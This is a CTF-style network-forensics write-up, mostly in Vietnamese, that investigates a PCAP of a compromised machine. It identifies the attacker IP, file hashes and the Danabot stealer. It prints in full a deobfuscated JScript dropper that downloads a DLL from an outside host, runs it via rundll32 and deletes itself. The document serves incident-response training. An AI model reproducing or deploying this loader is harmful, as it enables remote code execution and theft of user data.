# Mô tả

The SOC team has detected suspicious activity in the network traffic, revealing that a machine has been compromised. Sensitive company information has been stolen. Your task is to use Network Capture (PCAP) files and Threat Intelligence to investigate the incident and determine how the breach occurred.

Category:

[Network Forensics](https://cyberdefenders.org/blueteam-ctf-challenges/?categories=network-forensics)

Tactics:

[Execution](https://cyberdefenders.org/blueteam-ctf-challenges/?tactics=execution)	[Command and Control](https://cyberdefenders.org/blueteam-ctf-challenges/?tactics=command-and-control)

Tools:

[Wireshark](https://cyberdefenders.org/blueteam-ctf-challenges/?tools=wireshark)	[VirusTotal](https://cyberdefenders.org/blueteam-ctf-challenges/?tools=virustotal)	[ANY.RUN](https://cyberdefenders.org/blueteam-ctf-challenges/?tools=anyrun)	[Network Miner](https://cyberdefenders.org/blueteam-ctf-challenges/?tools=network-miner)

# Phân tích

## Q1 + Q2

Which IP address was used by the attacker during the initial access?

What is the name of the malicious file used for initial access?

Mở pcap lên thì thấy rằng các conversations trong statistics chỉ là của các máy local với nhau, phần lớn là máy người dùng và dns server. Quay lại pcap thì thấy có một vài GET request đến server `62.173.142.148/login.php` nhưng thay vì  hiện giao diện đăng nhập lại tải một file javascript bị obf, file được lưu thành login.php trên máy người dùng nhưng tên thực tế trên server là `allegato_708.js`

`62.173.142.148`

`allegato_708.js`

## Q3

What is the SHA-256 hash of the malicious file used for initial access?

Trên linux có thể check SH-256 hash bằng lệnh

```bash
sha256sum login.php
```

`847b4ad90b1daba2d9117a8e05776f3f902dda593fb1252289538acf476c4268`

## Q4

Which process was used to execute the malicious file?

[Deobf](https://obf-io.deobfuscate.io/) script js ta được

```javascript
function _0x414360(_0x5c5160) {
  var _0x119065 = '';
  var _0x5a393f = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".length;
  for (var _0x3d45b7 = 0x0; _0x3d45b7 < _0x5c5160; _0x3d45b7++) {
    _0x119065 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.floor(Math.random() * _0x5a393f));
  }
  return _0x119065 + ".dll";
}
var _0x48a85a = _0x414360(0xa);
var _0x44bdd9 = new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(0x2) + "\\" + _0x48a85a;
var _0x5da57f = WScript.CreateObject("MSXML2.XMLHTTP");
_0x5da57f.Open("GET", "http://soundata.top/resources.dll", false);
_0x5da57f.Send();
if (_0x5da57f.Status == 0xc8) {
  var _0x3c8952 = WScript.CreateObject("ADODB.Stream");
  _0x3c8952.Open();
  _0x3c8952.Type = 0x1;
  _0x3c8952.Write(_0x5da57f.ResponseBody);
  _0x3c8952.Position = 0x0;
  _0x3c8952.SaveToFile(_0x44bdd9, 0x2);
  _0x3c8952.Close();
  var _0x1e16b0 = WScript.CreateObject("Wscript.Shell");
  _0x1e16b0.Run("rundll32.exe /B " + _0x44bdd9 + ",start", 0x0, true);
}
new ActiveXObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName);
```

Chương trình được sử dụng để chạy script là

`wscript.exe`

## Q5 + Q6

What is the file extension of the second malicious file utilized by the attacker?

What is the MD5 hash of the second malicious file?

Trong script malware đã tải resources.dll từ `http://soundata.top/resources.dll` sử dụng `MSXML2.XMLHTTP` sau đó chạy  bằng `rundll32.exe /B` 

Để tìm MD5 hash ta sử dụng lệnh `md5sum` trong linux

`.dll`

`e758e07113016aca55d9eda2b0ffeebe`

# Resources.dll

[VirusTotal report](https://www.virustotal.com/gui/file/2597322a49a6252445ca4c8d713320b238113b3b8fd8a2d6fc1088a5934cee0e/detection)

Nhìn chung file này khi được gọi sẽ drop 1 file `WndResizerApp.exe` sử dụng một con stealer là `Danabot` để đánh cắp thông tin của người dùng rồi sau đó gửi chúng đến một C2 server `62.173.146.41:443`
